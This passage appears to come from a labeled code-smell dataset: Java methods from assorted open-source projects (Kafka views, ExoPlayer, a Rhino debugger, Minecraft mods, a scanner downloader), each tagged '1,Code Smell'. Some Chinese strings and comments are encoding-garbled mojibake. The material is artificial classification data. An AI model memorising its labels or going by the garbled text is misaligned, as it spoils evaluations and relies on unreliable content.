  List<GroupTopicConsumedDetailVO> voList=new ArrayList<>();
  for (  GroupMetrics groupMetrics : metricsResult.getData().getBizData()) {
    GroupTopicConsumedDetailVO vo=new GroupTopicConsumedDetailVO();
    vo.setTopicName(topicName);
    vo.setPartitionId(groupMetrics.getPartitionId());
    KSMemberDescription ksMemberDescription=tpMemberMap.get(new TopicPartition(topicName,groupMetrics.getPartitionId()));
    if (ksMemberDescription != null) {
      vo.setMemberId(ksMemberDescription.consumerId());
      vo.setHost(ksMemberDescription.host());
      vo.setClientId(ksMemberDescription.clientId());
    }
    vo.setLatestMetrics(groupMetrics);
    voList.add(vo);
  }
  return PaginationResult.buildSuc(voList,metricsResult);
}
",1,Code Smell
"@RequestMapping(value=""/{schemaId}/select"",produces=CONTENT_TYPE_JSON) public void select(HttpServletRequest request,HttpServletResponse response,org.springframework.ui.Model springModel,@PathVariable(""schemaId"") String schemaId,@RequestBody SqlpadSelectForm form) throws Throwable {
  final User user=getCurrentUser();
  String sqlpadId=form.getSqlpadId();
  final String sql=form.getSql();
  Integer startRow=form.getStartRow();
  Integer fetchSize=form.getFetchSize();
  Boolean returnMeta=form.getReturnMeta();
  if (isEmpty(sqlpadId) || isEmpty(sql))   throw new IllegalInputException();
  if (startRow == null)   startRow=1;
  if (fetchSize == null)   fetchSize=DEFAULT_SQL_RESULTSET_FETCH_SIZE;
  if (returnMeta == null)   returnMeta=false;
  if (fetchSize < 1)   fetchSize=1;
  if (fetchSize > 1000)   fetchSize=1000;
  final int startRowFinal=startRow;
  final int fetchSizeFinal=fetchSize;
  SqlSelectResult result=new ReturnSchemaConnExecutor<SqlSelectResult>(request,response,springModel,schemaId,true){
    @Override protected SqlSelectResult execute(    HttpServletRequest request,    HttpServletResponse response,    Model springModel,    Schema schema) throws Throwable {
      checkReadTableDataPermission(schema,user);
      SqlSelectResult result=getSqlSelectManager().select(getConnection(),sql,startRowFinal,fetchSizeFinal,buildDefaultLOBRowMapper());
      return result;
    }
  }
.execute();
  if (!Boolean.TRUE.equals(returnMeta))   result.setTable(null);
  response.setContentType(CONTENT_TYPE_JSON);
  Writer out=response.getWriter();
  this._objectMapperForBigNumberToString.writeValue(out,result);
}",1,Code Smell
"public static int process2(int[][] stickers,String t){
  if (t.length() == 0) {
    return 0;
  }
  char[] target=t.toCharArray();
  int[] tcounts=new int[26];
  for (  char cha : target) {
    tcounts[cha - 'a']++;
  }
  int N=stickers.length;
  int min=Integer.MAX_VALUE;
  for (int i=0; i < N; i++) {
    int[] sticker=stickers[i];
    if (sticker[target[0] - 'a'] > 0) {
      StringBuilder builder=new StringBuilder();
      for (int j=0; j < 26; j++) {
        if (tcounts[j] > 0) {
          int nums=tcounts[j] - sticker[j];
          for (int k=0; k < nums; k++) {
            builder.append((char)(j + 'a'));
          }
        }
      }
      String rest=builder.toString();
      min=Math.min(min,process2(stickers,rest));
    }
  }
  return min + (min == Integer.MAX_VALUE ? 0 : 1);
}",1,Code Smell
"/** 
 * Interrupts script execution.
 */
private void interrupted(Context cx,final StackFrame frame,Throwable scriptException){
  ContextData contextData=frame.contextData();
  boolean eventThreadFlag=callback.isGuiEventThread();
  contextData.eventThreadFlag=eventThreadFlag;
  boolean recursiveEventThreadCall=false;
  interruptedCheck: synchronized (eventThreadMonitor) {
    if (eventThreadFlag) {
      if (interruptedContextData != null) {
        recursiveEventThreadCall=true;
        break interruptedCheck;
      }
    }
 else {
      while (interruptedContextData != null) {
        try {
          eventThreadMonitor.wait();
        }
 catch (        InterruptedException exc) {
          return;
        }
      }
    }
    interruptedContextData=contextData;
  }
  if (recursiveEventThreadCall) {
    if (false) {
      while (this.returnValue == -1) {
        try {
          callback.dispatchNextGuiEvent();
        }
 catch (        InterruptedException ignored) {
        }
      }
    }
    return;
  }
  if (interruptedContextData == null)   Kit.codeBug();
  try {
    do {
      int frameCount=contextData.frameCount();
      this.frameIndex=frameCount - 1;
      final String threadTitle=Thread.currentThread().toString();
      final String alertMessage;
      if (scriptException == null) {
        alertMessage=null;
      }
 else {
        alertMessage=scriptException.toString();
      }
      int returnValue=-1;
      if (!eventThreadFlag) {
synchronized (monitor) {
          if (insideInterruptLoop)           Kit.codeBug();
          this.insideInterruptLoop=true;
          this.evalRequest=null;
          this.returnValue=-1;
          callback.enterInterrupt(frame,threadTitle,alertMessage);
          try {
            for (; ; ) {
              try {
                monitor.wait();
              }
 catch (              InterruptedException exc) {
                Thread.currentThread().interrupt();
                break;
              }
              if (evalRequest != null) {
                this.evalResult=null;
                try {
                  evalResult=do_eval(cx,evalFrame,evalRequest);
                }
  finally {
                  evalRequest=null;
                  evalFrame=null;
                  monitor.notify();
                }
                continue;
              }
              if (this.returnValue != -1) {
                returnValue=this.returnValue;
                break;
              }
            }
          }
  finally {
            insideInterruptLoop=false;
          }
        }
      }
 else {
        this.returnValue=-1;
        callback.enterInterrupt(frame,threadTitle,alertMessage);
        while (this.returnValue == -1) {
          try {
            callback.dispatchNextGuiEvent();
          }
 catch (          InterruptedException ignored) {
          }
        }
        returnValue=this.returnValue;
      }
switch (returnValue) {
case STEP_OVER:
        contextData.breakNextLine=true;
      contextData.stopAtFrameDepth=contextData.frameCount();
    break;
case STEP_INTO:
  contextData.breakNextLine=true;
contextData.stopAtFrameDepth=-1;
break;
case STEP_OUT:
if (contextData.frameCount() > 1) {
contextData.breakNextLine=true;
contextData.stopAtFrameDepth=contextData.frameCount() - 1;
}
break;
}
}
 while (false);
}
  finally {
synchronized (eventThreadMonitor) {
interruptedContextData=null;
eventThreadMonitor.notifyAll();
}
}
}",1,Code Smell
"/** 
 * @reason Use optimized variant
 * @author JellySquid
 */
@Override @Overwrite public int getPropagatedLevel(long fromId,long toId,int currentLevel){
  return this.getPropagatedLevel(fromId,null,toId,currentLevel);
}
/** 
 * This breaks up the call to method_20479 into smaller parts so we do not have to pass a mutable heap object to the method in order to extract the light result. This has a few other advantages, allowing us to: - Avoid the de-optimization that occurs from allocating and passing a heap object - Avoid unpacking coordinates twice for both the call to method_20479 and method_20710. - Avoid the the specific usage of AtomicInteger, which has additional overhead for the atomic get/set operations. - Avoid checking if the checked block is opaque twice. - Avoid a redundant block state lookup by re-using  {@param fromState}<p> The rest of the implementation has been otherwise copied from vanilla, but is optimized to avoid constantly (un)packing coordinates and to use an optimized direction lookup function.
 * @param fromState The re-usable block state at position {@param fromId}
 * @author JellySquid
 */
@Override public int getPropagatedLevel(long fromId,BlockState fromState,long toId,int currentLevel){
  if (toId == Long.MAX_VALUE) {
    return 15;
  }
 else   if (fromId == Long.MAX_VALUE && ((BlockLightStorageAccess)this.lightStorage).isLightEnabled(ChunkSectionPos.fromBlockPos(toId))) {
    return currentLevel + 15 - this.getLightSourceLuminance(toId);
  }
 else   if (currentLevel >= 15) {
    return currentLevel;
  }
  int toX=BlockPos.unpackLongX(toId);
  int toY=BlockPos.unpackLongY(toId);
  int toZ=BlockPos.unpackLongZ(toId);
  int fromX=BlockPos.unpackLongX(fromId);
  int fromY=BlockPos.unpackLongY(fromId);
  int fromZ=BlockPos.unpackLongZ(fromId);
  Direction dir=DirectionHelper.getVecDirection(toX - fromX,toY - fromY,toZ - fromZ);
  if (dir != null) {
    BlockState toState=this.getBlockStateForLighting(toX,toY,toZ);
    if (toState == null) {
      return 15;
    }
    int newLevel=this.getSubtractedLight(toState,toX,toY,toZ);
    if (newLevel >= 15) {
      return 15;
    }
    if (fromState == null) {
      fromState=this.getBlockStateForLighting(fromX,fromY,fromZ);
    }
    VoxelShape aShape=this.getOpaqueShape(fromState,fromX,fromY,fromZ,dir);
    VoxelShape bShape=this.getOpaqueShape(toState,toX,toY,toZ,dir.getOpposite());
    if (!LightUtil.unionCoversFullCube(aShape,bShape)) {
      return currentLevel + Math.max(1,newLevel);
    }
  }
  return 15;
}",1,Code Smell
"private void initDownload(){
  downButton.addActionListener(e -> new Thread(() -> {
    if (MainForm.LANG == MainForm.CHINESE) {
      JOptionPane.showMessageDialog(this.radPanel,""鐩墠浠呮敮鎸佷笅杞� 0.4 鐗堟湰"");
    }
 else {
      JOptionPane.showMessageDialog(this.radPanel,""Only support download 0.4 version"");
    }
    if (windowsAmd64RadioButton.isSelected()) {
      osType=""rad_windows_amd64.exe.zip"";
    }
 else     if (windows386RadioButton.isSelected()) {
      osType=""rad_windows_386.exe.zip"";
    }
 else     if (linux386RadioButton.isSelected()) {
      osType=""rad_linux_386.zip"";
    }
 else     if (linuxAmd64RadioButton.isSelected()) {
      osType=""rad_linux_amd64.zip"";
    }
 else     if (darwinAmd64RadioButton.isSelected()) {
      osType=""rad_darwin_amd64.zip"";
    }
 else     if (linuxArm64RadioButton.isSelected()) {
      osType=""rad_linux_arm64.zip"";
    }
 else {
      return;
    }
    progressBar.setValue(1);
    OkHttpClient okHttpClient=new OkHttpClient();
    String finalUrl=String.format(""%s/%s/%s"",xrayDownBase,xrayVersion,osType);
    progressBar.setValue(2);
    Request request=new Request.Builder().url(finalUrl).addHeader(""Connection"",""close"").build();
    progressBar.setValue(3);
    okHttpClient.newCall(request).enqueue(new Callback(){
      @Override public void onFailure(      Call call,      IOException e){
        e.printStackTrace();
      }
      @Override public void onResponse(      Call call,      Response response){
        InputStream is=null;
        byte[] buf=new byte[2048];
        int len;
        FileOutputStream fos=null;
        try {
          if (response.body() == null) {
            return;
          }
          is=response.body().byteStream();
          long total=response.body().contentLength();
          File file=new File(savePath,finalUrl.substring(finalUrl.lastIndexOf(""/"") + 1));
          fos=new FileOutputStream(file);
          progressBar.setValue(4);
          long sum=0;
          while ((len=is.read(buf)) != -1) {
            fos.write(buf,0,len);
            sum+=len;
            int progress=(int)(sum * 1.0f / total * 100);
            if (progress < 4) {
              progress=4;
            }
            progressBar.setValue(progress);
          }
          fos.flush();
        }
 catch (        Exception e) {
          e.printStackTrace();
        }
 finally {
          try {
            if (is != null)             is.close();
          }
 catch (          IOException ignored) {
          }
          try {
            if (fos != null)             fos.close();
          }
 catch (          IOException ignored) {
          }
          finish=true;
        }
      }
    }
);
  }
).start());
}",1,Code Smell
"@EventHandler private void onTick(TickEvent.Post event){
  float playerHealth=mc.player.getHealth();
  if (playerHealth <= 0) {
    this.toggle();
    return;
  }
  if (playerHealth <= health.get()) {
    disconnect(""Health was lower than "" + health.get() + ""."");
    if (smartToggle.get()) {
      this.toggle();
      enableHealthListener();
    }
  }
  if (smart.get() && playerHealth + mc.player.getAbsorptionAmount() - PlayerUtils.possibleHealthReductions() < health.get()) {
    disconnect(""Health was going to be lower than "" + health.get() + ""."");
    if (toggleOff.get())     this.toggle();
  }
  if (!onlyTrusted.get() && !instantDeath.get() && !crystalLog.get())   return;
  for (  Entity entity : mc.world.getEntities()) {
    if (entity instanceof PlayerEntity && player.getUuid() != mc.player.getUuid()) {
      if (onlyTrusted.get() && player != mc.player && !Friends.get().isFriend(player)) {
        disconnect(""A non-trusted player appeared in your render distance."");
        if (toggleOff.get())         this.toggle();
        break;
      }
      if (instantDeath.get() && PlayerUtils.isWithin(entity,8) && DamageUtils.getAttackDamage(player,mc.player) > playerHealth + mc.player.getAbsorptionAmount()) {
        disconnect(""Anti-32k measures."");
        if (toggleOff.get())         this.toggle();
        break;
      }
    }
    if (crystalLog.get() && entity instanceof EndCrystalEntity && PlayerUtils.isWithin(entity,range.get())) {
      disconnect(""End Crystal appeared within specified range."");
      if (toggleOff.get())       this.toggle();
    }
  }
}",1,Code Smell
"private void updateSuggestions(){
  updateSuggestions(true);
}
private void updateSuggestions(boolean scrollToTop){
  mSuggestionList.clear();
  Editable editable=mEditText.getText();
  String text="""";
  if (editable != null) {
    text=editable.toString();
  }
  if (mSuggestionProvider != null) {
    List<Suggestion> suggestions=mSuggestionProvider.providerSuggestions(text);
    if (suggestions != null && !suggestions.isEmpty()) {
      mSuggestionList.addAll(suggestions);
    }
  }
  String[] keywords=mSearchDatabase.getSuggestions(text,128);
  for (  String keyword : keywords) {
    mSuggestionList.add(new TagSuggestion(null,keyword));
  }
  EhTagDatabase ehTagDatabase=EhTagDatabase.getInstance(getContext());
  if (!TextUtils.isEmpty(text) && ehTagDatabase != null) {
    String[] s=text.split("" "");
    if (s.length > 0) {
      String keyword="""";
      for (int i=s.length - 1; i >= 0; i--) {
        if (s[i].contains("":"") || s[i].contains(""$"")) {
          break;
        }
 else {
          if (keyword.isEmpty())           keyword=s[i];
 else           keyword=s[i] + "" "" + keyword;
        }
      }
      keyword=keyword.trim();
      if (!keyword.isEmpty()) {
        List<Pair<String,String>> searchHints=ehTagDatabase.suggest(keyword);
        for (        Pair<String,String> searchHint : searchHints) {
          if (showTranslation) {
            mSuggestionList.add(new TagSuggestion(searchHint.first,searchHint.second));
          }
 else {
            mSuggestionList.add(new TagSuggestion(null,searchHint.second));
          }
        }
      }
    }
  }
  if (mSuggestionList.size() == 0) {
    removeListHeader();
  }
 else {
    addListHeader();
  }
  mSuggestionAdapter.notifyDataSetChanged();
  if (scrollToTop) {
    mListView.setSelection(0);
  }
}",1,Code Smell
"/** 
 * Paint a 2-bit/pixel code string, as defined by ETSI EN 300 743 7.2.5.2, to a canvas.
 */
private static int paint2BitPixelCodeString(ParsableBitArray data,int[] clutEntries,byte[] clutMapTable,int column,int line,Paint paint,Canvas canvas){
  boolean endOfPixelCodeString=false;
  do {
    int runLength=0;
    int clutIndex=0;
    int peek=data.readBits(2);
    if (peek != 0x00) {
      runLength=1;
      clutIndex=peek;
    }
 else     if (data.readBit()) {
      runLength=3 + data.readBits(3);
      clutIndex=data.readBits(2);
    }
 else     if (data.readBit()) {
      runLength=1;
    }
 else {
switch (data.readBits(2)) {
case 0x00:
        endOfPixelCodeString=true;
      break;
case 0x01:
    runLength=2;
  break;
case 0x02:
runLength=12 + data.readBits(4);
clutIndex=data.readBits(2);
break;
case 0x03:
runLength=29 + data.readBits(8);
clutIndex=data.readBits(2);
break;
}
}
if (runLength != 0 && paint != null) {
paint.setColor(clutEntries[clutMapTable != null ? clutMapTable[clutIndex] : clutIndex]);
canvas.drawRect(column,line,column + runLength,line + 1,paint);
}
column+=runLength;
}
 while (!endOfPixelCodeString);
return column;
}",1,Code Smell
"public static void transformFragmentCore(ASTParser t,TranslationUnit tree,Root root,Parameters parameters){
  ArrayList<NewDeclarationData> newDeclarationData=new ArrayList<>();
  ArrayList<ExternalDeclaration> declarationsToRemove=new ArrayList<>();
  for (  DeclarationExternalDeclaration declaration : root.nodeIndex.get(DeclarationExternalDeclaration.class)) {
    if (!nonLayoutOutDeclarationMatcher.matchesExtract(declaration)) {
      continue;
    }
    List<DeclarationMember> members=nonLayoutOutDeclarationMatcher.getNodeMatch(""name*"",DeclarationMember.class).getAncestor(TypeAndInitDeclaration.class).getMembers();
    TypeQualifier typeQualifier=nonLayoutOutDeclarationMatcher.getNodeMatch(""qualifier"",TypeQualifier.class);
    BuiltinNumericTypeSpecifier typeSpecifier=nonLayoutOutDeclarationMatcher.getNodeMatch(""type"",BuiltinNumericTypeSpecifier.class);
    int addedDeclarations=0;
    for (    DeclarationMember member : members) {
      String name=member.getName().getName();
      if (!name.startsWith(attachTargetPrefix)) {
        continue;
      }
      String numberSuffix=name.substring(attachTargetPrefix.length());
      if (numberSuffix.isEmpty()) {
        continue;
      }
      int number;
      try {
        number=Integer.parseInt(numberSuffix);
      }
 catch (      NumberFormatException e) {
        continue;
      }
      if (number < 0 || 7 < number) {
        continue;
      }
      newDeclarationData.add(new NewDeclarationData(typeQualifier,typeSpecifier,member,number));
      addedDeclarations++;
    }
    if (addedDeclarations == members.size()) {
      declarationsToRemove.add(declaration);
    }
  }
  tree.getChildren().removeAll(declarationsToRemove);
  for (  ExternalDeclaration declaration : declarationsToRemove) {
    declaration.detachParent();
  }
  ArrayList<ExternalDeclaration> newDeclarations=new ArrayList<>();
  for (  NewDeclarationData data : newDeclarationData) {
    DeclarationMember member=data.member;
    member.detach();
    TypeQualifier newQualifier=data.qualifier.cloneInto(root);
    newQualifier.getChildren().add(new LayoutQualifier(Stream.of(new NamedLayoutQualifierPart(new Identifier(""location""),new LiteralExpression(Type.INT32,data.number)))));
    ExternalDeclaration newDeclaration=layoutedOutDeclarationTemplate.getInstanceFor(root,newQualifier,data.type.cloneInto(root),member);
    newDeclarations.add(newDeclaration);
  }
  tree.injectNodes(ASTInjectionPoint.BEFORE_DECLARATIONS,newDeclarations);
}",1,Code Smell
"/** 
 * 澶勭悊涓�琛孲QL鍐呭銆�
 * @param sqlStatements
 * @param sqlBuilder
 * @param line
 */
protected void handleLine(List<SqlStatement> sqlStatements,StringBuilder sqlBuilder,String line){
  boolean isSqlBuilderEmpty=isEmpty(sqlBuilder);
  boolean findDelimiter=true;
  String trimmedLine=line.trim();
  if (trimmedLine.isEmpty()) {
    if (!isSqlBuilderEmpty) {
      sqlBuilder.append(line);
      sqlBuilder.append(LINE_SEPARATOR);
    }
    findDelimiter=false;
  }
  boolean isCommentLine=isCommentLine(trimmedLine);
  if (isCommentLine) {
    Matcher matcher=DELIMITER_PATTERN.matcher(trimmedLine);
    if (matcher.find()) {
      this.delimiter=matcher.group(5);
      if (!isSqlBuilderEmpty)       sqlBuilder.append(LINE_SEPARATOR);
      findDelimiter=false;
    }
  }
  if (findDelimiter) {
    if (isSqlBuilderEmpty)     _currentSqlStartRow=_currentRow;
    int handleIndex=0;
    int lineLength=line.length();
    while (handleIndex < lineLength) {
      if (isSqlBuilderEmpty) {
        _currentSqlStartRow=_currentRow;
        _currentSqlStartColumn=handleIndex;
      }
      int delimiterIndex=findNextDelimiterIndex(sqlBuilder,line,handleIndex);
      if (delimiterIndex < 0) {
        if (isCommentLine && isSqlBuilderEmpty)         ;
 else {
          sqlBuilder.append(line.substring(handleIndex));
          sqlBuilder.append(LINE_SEPARATOR);
          isSqlBuilderEmpty=false;
        }
        _currentSqlEndRow=_currentRow;
        _currentSqlEndColumn=lineLength;
        handleIndex=lineLength;
      }
 else {
        if (delimiterIndex > 0) {
          _currentSqlEndRow=_currentRow;
          _currentSqlEndColumn=delimiterIndex;
          String scriptBefore=line.substring(handleIndex,delimiterIndex);
          sqlBuilder.append(scriptBefore);
        }
        addSqlStatement(sqlStatements,sqlBuilder);
        clear(sqlBuilder);
        isSqlBuilderEmpty=true;
        handleIndex=delimiterIndex + this.delimiter.length();
      }
    }
  }
  _currentRow++;
}",1,Code Smell
"@Override protected void onVisibilityChanged(boolean isVisible,Animation anim){
  if (mControlWrapper.isFullScreen()) {
    if (isVisible) {
      if (mLockButton.getVisibility() == GONE) {
        mLockButton.setVisibility(VISIBLE);
        if (anim != null) {
          mLockButton.startAnimation(anim);
        }
      }
      if (mFavouriteBtn.getVisibility() == GONE) {
        mFavouriteBtn.setVisibility(VISIBLE);
        if (anim != null) {
          mFavouriteBtn.startAnimation(anim);
        }
      }
    }
 else {
      mLockButton.setVisibility(GONE);
      if (anim != null) {
        mLockButton.startAnimation(anim);
      }
      mFavouriteBtn.setVisibility(GONE);
      if (anim != null) {
        mFavouriteBtn.startAnimation(anim);
      }
    }
  }
}
",1,Code Smell
"private void handleSourceInfoRefreshed(MediaSourceRefreshInfo sourceRefreshInfo) throws ExoPlaybackException {
  if (sourceRefreshInfo.source != mediaSource) {
    return;
  }
  playbackInfoUpdate.incrementPendingOperationAcks(pendingPrepareCount);
  pendingPrepareCount=0;
  Timeline oldTimeline=playbackInfo.timeline;
  Timeline timeline=sourceRefreshInfo.timeline;
  Object manifest=sourceRefreshInfo.manifest;
  queue.setTimeline(timeline);
  playbackInfo=playbackInfo.copyWithTimeline(timeline,manifest);
  resolvePendingMessagePositions();
  MediaPeriodId newPeriodId=playbackInfo.periodId;
  long oldContentPositionUs=playbackInfo.periodId.isAd() ? playbackInfo.contentPositionUs : playbackInfo.positionUs;
  long newContentPositionUs=oldContentPositionUs;
  if (pendingInitialSeekPosition != null) {
    Pair<Object,Long> periodPosition=resolveSeekPosition(pendingInitialSeekPosition,true);
    pendingInitialSeekPosition=null;
    if (periodPosition == null) {
      handleSourceInfoRefreshEndedPlayback();
      return;
    }
    newContentPositionUs=periodPosition.second;
    newPeriodId=queue.resolveMediaPeriodIdForAds(periodPosition.first,newContentPositionUs);
  }
 else   if (oldContentPositionUs == C.TIME_UNSET && !timeline.isEmpty()) {
    Pair<Object,Long> defaultPosition=getPeriodPosition(timeline,timeline.getFirstWindowIndex(shuffleModeEnabled),C.TIME_UNSET);
    newPeriodId=queue.resolveMediaPeriodIdForAds(defaultPosition.first,defaultPosition.second);
    if (!newPeriodId.isAd()) {
      newContentPositionUs=defaultPosition.second;
    }
  }
 else   if (timeline.getIndexOfPeriod(newPeriodId.periodUid) == C.INDEX_UNSET) {
    Object newPeriodUid=resolveSubsequentPeriod(newPeriodId.periodUid,oldTimeline,timeline);
    if (newPeriodUid == null) {
      handleSourceInfoRefreshEndedPlayback();
      return;
    }
    Pair<Object,Long> defaultPosition=getPeriodPosition(timeline,timeline.getPeriodByUid(newPeriodUid,period).windowIndex,C.TIME_UNSET);
    newContentPositionUs=defaultPosition.second;
    newPeriodId=queue.resolveMediaPeriodIdForAds(defaultPosition.first,newContentPositionUs);
  }
 else {
    newPeriodId=queue.resolveMediaPeriodIdForAds(playbackInfo.periodId.periodUid,newContentPositionUs);
    if (!playbackInfo.periodId.isAd() && !newPeriodId.isAd()) {
      newPeriodId=playbackInfo.periodId;
    }
  }
  if (playbackInfo.periodId.equals(newPeriodId) && oldContentPositionUs == newContentPositionUs) {
    if (!queue.updateQueuedPeriods(rendererPositionUs,getMaxRendererReadPositionUs())) {
      seekToCurrentPosition(false);
    }
  }
 else {
    MediaPeriodHolder periodHolder=queue.getFrontPeriod();
    if (periodHolder != null) {
      while (periodHolder.getNext() != null) {
        periodHolder=periodHolder.getNext();
        if (periodHolder.info.id.equals(newPeriodId)) {
          periodHolder.info=queue.getUpdatedMediaPeriodInfo(periodHolder.info);
        }
      }
    }
    long newPositionUs=newPeriodId.isAd() ? 0 : newContentPositionUs;
    long seekedToPositionUs=seekToPeriodPosition(newPeriodId,newPositionUs);
    playbackInfo=playbackInfo.copyWithNewPosition(newPeriodId,seekedToPositionUs,newContentPositionUs,getTotalBufferedDurationUs());
  }
  handleLoadingMediaPeriodChanged(false);
}",1,Code Smell
"@Override public int previousClearBit(int fromIndex){
  if (fromIndex < 0) {
    if (fromIndex == -1) {
      return -1;
    }
    throw new IndexOutOfBoundsException(""fromIndex < 0: "" + fromIndex);
  }
  final long[][][] table=this.table;
  final int tableSize=table.length - 1;
  int w=wordIndex(fromIndex);
  int w1=level1Index(w);
  if (w1 > tableSize) {
    return fromIndex;
  }
  int w2=level2Index(w);
  int w3=level3Index(w);
  int w4=fromIndex % BITS_PER_WORD;
  long word;
  long[][] a2;
  long[] a3;
  for (; w1 >= 0; --w1) {
    if ((a2=table[w1]) == null) {
      return bitIndex(w1,w2,w3) + w4;
    }
    for (; w2 >= 0; --w2) {
      if ((a3=a2[w2]) == null) {
        return bitIndex(w1,w2,w3) + w4;
      }
      for (; w3 >= 0; --w3) {
        if ((word=a3[w3]) == 0) {
          return bitIndex(w1,w2,w3) + w4;
        }
        for (int offset=w4; offset >= 0; --offset) {
          if ((word & (1L << offset)) == 0) {
            return bitIndex(w1,w2,w3) + offset;
          }
        }
        w4=WORD_SIZE;
      }
      w3=LENGTH3_SIZE;
    }
    w2=LENGTH2_SIZE;
  }
  return -1;
}",1,Code Smell
"public void recursionDel(Long datasourceId) throws DEException {
  CoreDatasource coreDatasource=datasourceMapper.selectById(datasourceId);
  if (ObjectUtils.isEmpty(coreDatasource)) {
    return;
  }
  if (coreDatasource.getType().equals(DatasourceConfiguration.DatasourceType.Excel.name())) {
    DatasourceRequest datasourceRequest=new DatasourceRequest();
    datasourceRequest.setDatasource(coreDatasource);
    List<DatasetTableDTO> tables=ExcelUtils.getTables(datasourceRequest);
    for (    DatasetTableDTO table : tables) {
      datasourceRequest.setTable(table.getTableName());
      try {
        datasourceSyncManage.dropEngineTable(datasourceRequest.getTable());
      }
 catch (      Exception e) {
        DEException.throwException(""Failed to drop table "" + datasourceRequest.getTable());
      }
    }
  }
  if (coreDatasource.getType().equals(DatasourceConfiguration.DatasourceType.API.name())) {
    DatasourceRequest datasourceRequest=new DatasourceRequest();
    datasourceRequest.setDatasource(coreDatasource);
    List<DatasetTableDTO> tables=ApiUtils.getTables(datasourceRequest);
    for (    DatasetTableDTO api : tables) {
      datasourceRequest.setTable(api.getTableName());
      try {
        datasourceSyncManage.dropEngineTable(datasourceRequest.getTable());
      }
 catch (      Exception e) {
        DEException.throwException(""Failed to drop table "" + datasourceRequest.getTable());
      }
    }
    datasourceTaskServer.deleteByDSId(datasourceId);
  }
  datasourceMapper.deleteById(datasourceId);
  if (!Arrays.asList(""API"",""Excel"",""folder"").contains(coreDatasource.getType())) {
    calciteProvider.delete(coreDatasource);
  }
  if (coreDatasource.getType().equals(DatasourceConfiguration.DatasourceType.folder.name())) {
    QueryWrapper<CoreDatasource> wrapper=new QueryWrapper<>();
    wrapper.eq(""pid"",datasourceId);
    List<CoreDatasource> coreDatasources=datasourceMapper.selectList(wrapper);
    if (ObjectUtils.isNotEmpty(coreDatasources)) {
      for (      CoreDatasource record : coreDatasources) {
        delete(record.getId());
      }
    }
  }
}
",1,Code Smell
"public void presentFragment(INavigationLayout navigationLayout,BaseFragment fragment){
  if (isPaused) {
    return;
  }
  this.navigationLayout=navigationLayout;
  if (fragment.onFragmentCreate()) {
    fragment.setInPreviewMode(true);
    fragment.setParentLayout(navigationLayout);
    View view=fragment.createView(getContext());
    fragment.onResume();
    addView(currentFragmentView=view);
    BaseFragment oldFragment=currentFragment;
    if (fragment instanceof BaseFragmentWithFullscreen) {
      currentFragmentFullscreenView=((BaseFragmentWithFullscreen)fragment).getFullscreenView();
      addView(currentFragmentFullscreenView);
    }
    currentFragment=fragment;
    fragmentDialogId=0;
    if (currentFragment instanceof TopicsFragment) {
      fragmentDialogId=-((TopicsFragment)currentFragment).chatId;
    }
    if (fragment.getActionBar() != null) {
      addView(currentActionBarView=fragment.getActionBar());
      currentActionBarView.listenToBackgroundUpdate(this::invalidate);
    }
    if (oldFragment != null) {
      animateReplace(oldFragment);
    }
 else     if (!isOpenned) {
      isOpenned=true;
      if (!SharedConfig.animationsEnabled()) {
        openAnimationStarted(true);
        fragment.onTransitionAnimationStart(true,false);
        fragment.onTransitionAnimationEnd(true,false);
        openedProgress=1f;
        updateOpenAnimationProgress();
        openAnimationFinished();
        return;
      }
      animationIndex=NotificationCenter.getInstance(currentAccount).setAnimationInProgress(animationIndex,null);
      openAnimator=ValueAnimator.ofFloat(0,1f);
      openedProgress=0;
      openAnimationStarted(true);
      updateOpenAnimationProgress();
      fragment.onTransitionAnimationStart(true,false);
      openAnimator.addUpdateListener(animation -> {
        openedProgress=(float)animation.getAnimatedValue();
        updateOpenAnimationProgress();
      }
);
      openAnimator.addListener(new AnimatorListenerAdapter(){
        @Override public void onAnimationEnd(        Animator animation){
          if (openAnimator == null) {
            return;
          }
          openAnimator=null;
          NotificationCenter.getInstance(currentAccount).onAnimationFinish(animationIndex);
          fragment.onTransitionAnimationEnd(true,false);
          openedProgress=1f;
          updateOpenAnimationProgress();
          openAnimationFinished();
        }
      }
);
      openAnimator.setDuration(250);
      openAnimator.setInterpolator(CubicBezierInterpolator.DEFAULT);
      openAnimator.setStartDelay(SharedConfig.getDevicePerformanceClass() >= SharedConfig.PERFORMANCE_CLASS_HIGH ? 50 : 150);
      openAnimator.start();
    }
    fragment.setPreviewDelegate(() -> finishPreview());
  }
}",1,Code Smell
"public static void main(String[] args) throws IOException, InterruptedException {
  if (args == null || args.length < 8) {
    System.out.println(""args error"");
    System.exit(0);
  }
  long ts=System.currentTimeMillis();
  String resultDir="""";
  String logPath="""";
  String mappingPath="""";
  String graphPath="""";
  for (int i=0; i < args.length; i=i + 2) {
switch (args[i]) {
case RESULT:
      resultDir=args[i + 1];
    break;
case LOG_PATH:
  logPath=args[i + 1];
break;
case MAPPING:
mappingPath=args[i + 1];
break;
case GRAPH:
graphPath=args[i + 1];
break;
}
}
if (!resultDir.endsWith(""/"")) {
resultDir=resultDir + ""/"";
}
File rawHitCountFile=new File(resultDir + ""rawHitCount.txt"");
File hitCountFile=new File(resultDir + ""hitCount.txt"");
prepareResultFile(rawHitCountFile,hitCountFile);
nodeMap=gson.fromJson(FileUtil.readFile(graphPath),new TypeToken<Map<String,Node>>(){
}
.getType());
id2ClazzMap=new HashMap<>(80000);
className2HitCountMap=new HashMap<>(60000);
className2ClinitMap=new HashMap<>(10000);
readMappingMap(mappingPath);
readLogMap(logPath);
Node objectNode=prepareObjectNode();
LogUtil.log(""-----------------"");
LogUtil.log(""nodeMap size:"" + nodeMap.size());
LogUtil.log(""id2ClazzMap.size():"" + id2ClazzMap.size());
LogUtil.log(""className2HitCountMap.size():"" + className2HitCountMap.size());
LogUtil.log(""className2ClinitMap.size():"" + className2ClinitMap.size());
LogUtil.log(""-----------------"");
CountDownLatch countDownLatch=new CountDownLatch(2);
new Thread(() -> {
try {
buildRawHitCountFile(rawHitCountFile.getPath());
}
 catch (IOException e) {
e.printStackTrace();
System.exit(0);
}
 finally {
countDownLatch.countDown();
}
}
).start();
new Thread(() -> {
computeHit(objectNode);
try {
buildCoverageFile(hitCountFile.getPath());
}
 catch (IOException e) {
e.printStackTrace();
}
 finally {
countDownLatch.countDown();
}
}
).start();
countDownLatch.await();
long t=System.currentTimeMillis() - ts;
System.out.println(""fine! use time :"" + t + "" ms"");
}",1,Code Smell
"public static void loadConfig(boolean force){
synchronized (sync) {
    if (configLoaded && !force) {
      return;
    }
    for (int i=0; i < configs.size(); i++) {
      ConfigItem o=configs.get(i);
      if (o.type == configTypeBool) {
